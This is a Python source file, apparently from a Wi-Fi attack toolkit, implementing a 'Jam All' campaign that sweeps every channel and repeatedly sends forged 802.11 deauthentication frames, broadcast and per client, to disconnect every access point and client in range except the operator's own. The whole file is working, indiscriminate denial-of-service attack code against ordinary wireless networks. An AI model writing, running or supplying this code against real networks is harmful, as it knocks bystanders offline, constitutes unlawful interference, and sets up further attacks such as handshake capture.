"""Global deauthentication sweep over every AP and client the scanner knows."""
from __future__ import annotations

import asyncio
import logging
from collections import defaultdict
from typing import Callable, Optional

from wifit3.dot11.deauth import build_deauth, deauth_nav_bytes
from wifit3.dot11.mac import str_to_mac
from wifit3.persist.config import Config

from . import treelog
from .campaign import Campaign

logger = logging.getLogger(__name__)

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
DEAUTH_REASON = 7
BROADCAST_BURST = 12
CLIENT_ROUNDS = 3
FRAME_GAP_S = 0.01
CHANNEL_GAP_S = 0.02
SWEEP_GAP_S = 0.2


class JamAllCampaign(Campaign):
    """Sweeps every known AP and associated client until stopped."""

    button_id = None
    key = "jam_all"
    hotkey = None
    stoppable = True
    idle_label = "Jam All"
    run_label = "Stop Jam"
    idle_variant = "primary"
    run_variant = "error"

    def __init__(self, array, log: Optional[Callable[[str], None]] = None) -> None:
        super().__init__(ap=None, array=array)
        self.log = log or (lambda _m: None)
        self.sweeps = 0
        self.frames_sent = 0
        self.ap_bursts = 0
        self.client_frames = 0
        self.channels_swept: list[int] = []

    @property
    def iface(self):
        """The elected TX card: pinned when it reaches targets, else the card covering most."""
        if self._iface is None and self.array is not None:
            members = self.array.members or []
            channels = self._target_channels()
            candidates = [m for m in members if channels & set(m.supported_channels)]
            preferred = self.array.preferred
            if preferred in candidates:
                self._iface = preferred
            elif candidates:
                self._iface = max(
                    candidates, key=lambda m: len(channels & set(m.supported_channels)))
            else:
                self._iface = preferred or (members[0] if members else None)
        return self._iface

    def _target_channels(self) -> set[int]:
        own = self._own_macs()
        return {ap.channel for ap in self.array.access_points.values()
                if ap.bssid.lower() not in own and not Config.is_silenced(ap.bssid)}

    def status_headlines(self, vault=None) -> list[str]:
        return ["[bold cyan]● Jam All[/bold cyan] sweeping every known AP",
                f"[dim]sweeps:{self.sweeps} · channels:{len(self.channels_swept)} · "
                f"ap bursts:{self.ap_bursts} · client frames:{self.client_frames} · "
                f"total:{self.frames_sent}[/dim]"]

    def _own_macs(self) -> set[str]:
        return {mac.lower() for mac in (self.array.forged_macs or ())}

    def _targets_by_channel(self, iface) -> dict[int, list]:
        supported = set(iface.supported_channels)
        groups: dict[int, list] = defaultdict(list)
        own = self._own_macs()
        for ap in self.array.access_points.values():
            bssid = ap.bssid.lower()
            if bssid in own or Config.is_silenced(bssid) or ap.channel not in supported:
                continue
            groups[ap.channel].append(ap)
        return dict(groups)

    def _clients(self, ap) -> list[str]:
        bssid = ap.bssid.lower()
        own = self._own_macs()
        return [mac for mac, client in self.array.clients.items()
                if mac.lower() not in own and (client.bssid or "").lower() == bssid]

    def _broadcast_frame(self, ap) -> bytes:
        ap_mac = str_to_mac(ap.bssid)
        return build_deauth(str_to_mac(BROADCAST_MAC), ap_mac, ap_mac, DEAUTH_REASON,
                            duration=deauth_nav_bytes(BROADCAST_MAC))

    def _client_frames(self, ap, client_mac: str) -> tuple[bytes, bytes]:
        ap_mac = str_to_mac(ap.bssid)
        client = str_to_mac(client_mac)
        return (
            build_deauth(client, ap_mac, ap_mac, DEAUTH_REASON,
                         duration=deauth_nav_bytes(client_mac)),
            build_deauth(ap_mac, client, ap_mac, DEAUTH_REASON,
                         duration=deauth_nav_bytes(ap.bssid)),
        )

    async def _send_burst(self, iface, frames, rounds: int) -> int:
        sent = 0
        for _ in range(rounds):
            for frame in frames:
                if self.stopped:
                    return sent
                await iface.send_no_wait(frame)
                sent += 1
                self.frames_sent += 1
                await asyncio.sleep(FRAME_GAP_S)
        return sent

    async def _sweep(self, iface) -> bool:
        groups = self._targets_by_channel(iface)
        if not groups:
            return False
        for channel in sorted(groups):
            if self.stopped:
                break
            await iface.set_channel(channel)
            if channel not in self.channels_swept:
                self.channels_swept.append(channel)
            await asyncio.sleep(CHANNEL_GAP_S)
            for ap in groups[channel]:
                if self.stopped:
                    break
                self.ap_bursts += await self._send_burst(
                    iface, (self._broadcast_frame(ap),), BROADCAST_BURST)
                for mac in self._clients(ap):
                    if self.stopped:
                        break
                    self.client_frames += await self._send_burst(
                        iface, self._client_frames(ap, mac), CLIENT_ROUNDS)
            await asyncio.sleep(CHANNEL_GAP_S)
        return True

    async def _loop(self) -> None:
        iface = self.iface
        if iface is None:
            self.log(treelog.leaf_fail("Jam All: no card available"))
            return
        groups = self._targets_by_channel(iface)
        if not groups:
            self.log(treelog.leaf_fail("Jam All: no target AP on this card"))
            return
        aps = sum(len(aps) for aps in groups.values())
        self.log(treelog.header(f"Jam All: {aps} AP(s) on {len(groups)} channel(s)"))
        original_channel = iface.current_channel
        async with self.array.claim(iface):
            try:
                async with self.array.lease(iface=iface):
                    while not self.stopped:
                        self.sweeps += 1
                        await self._sweep(iface)
                        self.log(treelog.branch(self.status_headlines()[1]))
                        await asyncio.sleep(SWEEP_GAP_S)
            finally:
                await iface.set_channel(original_channel)

    async def teardown(self) -> None:
        self.log(treelog.leaf(f"Jam All stopped: {self.sweeps} sweep(s), "
                              f"{self.frames_sent} frame(s)"))
